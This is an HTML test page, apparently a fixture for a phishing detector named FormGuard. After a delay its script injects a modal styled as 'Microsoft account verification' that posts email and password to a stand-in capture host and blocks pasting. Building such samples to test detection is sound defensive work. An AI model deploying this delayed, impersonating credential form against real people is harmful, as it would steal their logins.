<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Account Security Check</title>
    <style>
      body {
        margin: 0;
        min-height: 100vh;
        display: grid;
        place-items: center;
        font-family: Arial, sans-serif;
        background: #edf4f8;
        color: #17202a;
      }

      main {
        width: min(620px, calc(100vw - 32px));
      }

      .modal {
        position: fixed;
        inset: 0;
        z-index: 99;
        display: grid;
        place-items: center;
        background: rgba(17, 32, 46, 0.28);
      }

      form {
        width: min(380px, calc(100vw - 32px));
        padding: 24px;
        border: 1px solid #d8dee6;
        border-radius: 8px;
        background: #ffffff;
      }

      label,
      input,
      button {
        display: block;
        width: 100%;
      }

      label {
        margin-top: 14px;
        font-weight: 700;
      }

      input {
        margin-top: 6px;
        min-height: 38px;
      }

      button {
        min-height: 40px;
        margin-top: 18px;
      }
    </style>
  </head>
  <body>
    <main>
      <h1>Account security review</h1>
      <p>This page injects a credential form after load for FormGuard testing.</p>
    </main>

    <script>
      window.setTimeout(() => {
        const modal = document.createElement("div");
        modal.className = "modal";
        modal.innerHTML = `
          <form method="post" action="https://credential-capture.example.test/delayed-session" autocomplete="off" onpaste="return false">
            <h2>Microsoft account verification</h2>
            <label for="delayed-email">Email</label>
            <input id="delayed-email" name="email" type="email" autocomplete="off" />
            <label for="delayed-password">Password</label>
            <input id="delayed-password" name="password" type="password" autocomplete="off" />
            <button type="submit">Continue</button>
          </form>
        `;
        document.body.appendChild(modal);
      }, 2500);
    </script>
  </body>
</html>
